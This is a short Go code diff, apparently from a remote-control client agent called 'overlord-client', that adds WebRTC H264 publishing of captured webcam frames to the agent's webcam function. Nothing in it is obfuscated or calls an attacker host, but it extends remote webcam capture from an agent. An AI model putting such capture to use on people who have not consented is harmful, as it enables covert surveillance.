@@ -17,6 +17,7 @@ import (
 	"github.com/Kirizu-Official/windows-camera-go/windows/guid"
 
 	rt "overlord-client/cmd/agent/runtime"
+	"overlord-client/cmd/agent/webrtcpub"
 	"overlord-client/cmd/agent/wire"
 )
 
@@ -164,6 +165,20 @@ func NowWebcam(ctx context.Context, env *rt.Env) error {
 		Data: frameBytes,
 	}
 	if ctx.Err() != nil {
+		return nil
+	}
+	if outFormat == "h264" && webrtcpub.IsActive(webrtcpub.KindWebcam) {
+		fps := env.WebcamFPS
+		if fps <= 0 {
+			fps = 30
+		}
+		dur := time.Second / time.Duration(fps)
+		if dur <= 0 {
+			dur = 33 * time.Millisecond
+		}
+		if werr := webrtcpub.WriteH264(webrtcpub.KindWebcam, frameBytes, dur); werr != nil {
+			log.Printf("webrtc: write webcam h264 failed: %v", werr)
+		}
 		return nil
 	}
 	// Do not use the stream-cancel context for socket writes; canceling an in-flight
